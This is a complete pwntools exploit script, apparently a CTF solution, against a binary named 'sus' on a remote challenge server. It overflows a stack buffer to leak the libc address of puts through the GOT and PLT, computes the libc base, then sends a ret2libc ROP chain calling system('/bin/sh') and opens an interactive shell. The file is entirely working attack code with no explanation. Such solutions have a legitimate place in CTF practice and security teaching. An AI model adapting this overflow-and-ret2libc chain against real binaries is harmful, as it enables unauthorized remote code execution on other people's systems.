from pwn import *

context.log_level='debug'
elf = ELF("./sus")
r = remote("chall.lac.tf", 31284)
# libc = ELF("./libc.so.6")
# pop_rdi_ret = 0x0000000000027725
# ret = 0x00000000000270c2

libc = ELF("./libc/libc6_2.36-9+deb12u4_amd64.so")
pop_rdi_ret = 0x00000000000277e5
ret = 0x0000000000027182

# ### local test ###
# r = process("./sus")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# pop_rdi_ret = 0x000000000002a3e5
# ret = 0x0000000000029cd6

r.recvuntil(b"sus?\n")
payload = b'a'*56+p64(elf.got['puts'])+b'a'*8+p64(elf.plt['puts'])+p64(elf.sym['main'])
r.sendline(payload)

recv = r.recv(6)
print(f"recevied: {recv}")
print("received hex:", hex(u64(recv.ljust(8, b'\x00'))))
libc_base = u64(recv.ljust(8, b'\x00')) - libc.symbols['puts']
print(f"libc_base: {hex(libc_base)}")

payload = b'a'*72 + p64(libc_base+pop_rdi_ret) + p64(libc_base+next(libc.search(b'/bin/sh'))) + p64(libc_base+ret) + p64(libc_base+libc.symbols['system'])
r.sendline(payload)

r.interactive()